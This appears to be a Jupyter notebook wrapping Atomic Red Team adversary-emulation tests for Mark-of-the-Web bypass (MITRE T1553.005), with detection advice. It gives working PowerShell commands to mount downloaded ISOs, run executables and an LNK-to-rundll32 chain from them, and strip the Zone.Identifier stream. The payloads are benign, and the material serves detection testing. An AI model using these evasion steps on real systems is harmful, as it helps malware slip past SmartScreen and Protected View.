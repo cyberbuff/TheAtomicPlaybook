{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "197cff1e",
   "metadata": {},
   "source": "# T1553.005 - Mark-of-the-Web Bypass\nAdversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)"
  },
  {
   "cell_type": "markdown",
   "id": "218f6ee7",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "df4fc0bc",
   "metadata": {},
   "source": "### Atomic Test #1 - Mount ISO image\nMounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: T1553.005.iso must exist on disk at specified location (#{path_of_iso})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso) -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile \"PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b340051a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "22f4edf0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nMount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c21d75a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "6e9e538f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nDismount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso\" | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fde13188",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "24fe5fb7",
   "metadata": {},
   "source": "### Atomic Test #2 - Mount an ISO image and run executable from the ISO\nMounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  \n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso) -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile \"PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f826fa1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "487cc85b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$keep = Mount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98b82c50",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "baa4a3f9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nDismount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso\" | Out-Null\nStop-process -name \"hello\" -Force -ErrorAction ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5d08813",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "51f8da37",
   "metadata": {},
   "source": "### Atomic Test #3 - Remove the Zone.Identifier alternate data stream\nRemove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A test file with the Zone.Identifier attribute must be present.\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:tmp\\ReadMe.md) { EXIT 0 } else { EXIT 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md -OutFile $env:tmp\\ReadMe.md\nSet-Content -Path $env:tmp\\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0a21d4f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "267ca184",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nUnblock-File -Path $env:tmp\\ReadMe.md\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17e819ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "19f2c64e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-Content -Path $env:tmp\\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92fe1c1d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b22cd45f",
   "metadata": {},
   "source": "### Atomic Test #4 - Execute LNK file from ISO\nExecutes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso) -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile \"PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1dda750b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f182d461",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nMount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a20a7293",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "f0c7076c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nDismount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso\" | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36550396",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.005 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9b4850b6",
   "metadata": {},
   "source": "## Detection\nMonitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.(Citation: Disable automount for ISO)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}